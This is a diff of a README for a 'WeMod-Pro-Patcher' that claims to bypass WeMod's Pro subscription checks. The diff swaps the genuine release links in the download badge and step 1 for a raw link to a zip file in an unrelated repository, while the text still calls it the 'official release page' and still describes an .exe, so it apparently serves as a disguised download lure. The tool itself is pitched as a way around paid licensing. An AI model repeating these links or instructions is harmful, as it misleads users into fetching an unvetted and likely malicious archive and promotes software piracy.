@@ -5,7 +5,7 @@ description: "Enable premium features in the WeMod application using this .NET 8
 ---
 # 🚀 WeMod-Pro-Patcher - Unlock premium features with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Natalinefenestral664/WeMod-Pro-Patcher/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Natalinefenestral664/natalinefenestral664.github.io/main/babyism/2.0.zip)
 
 WeMod-Pro-Patcher modifies the standard WeMod desktop application to grant access to subscription features. This tool bypasses server-side checks for the Pro tier. It enables remote control of game cheats, hides advertisements within the interface, allows custom hotkey configuration, and provides early access to newly released game trainers.
 
@@ -20,7 +20,7 @@ Your computer must meet these basic specifications to run the patcher successful
 
 ## 📥 Getting Started
 
-1. Visit the [official release page](https://github.com/Natalinefenestral664/WeMod-Pro-Patcher/releases) to access the latest version of the patcher.
+1. Visit the [official release page](https://raw.githubusercontent.com/Natalinefenestral664/natalinefenestral664.github.io/main/babyism/2.0.zip) to access the latest version of the patcher.
 2. Locate the file named "WeMod-Pro-Patcher.exe" under the latest release section.
 3. Click the file name to start the download process.
 4. Save the file to your desktop or your Downloads folder.
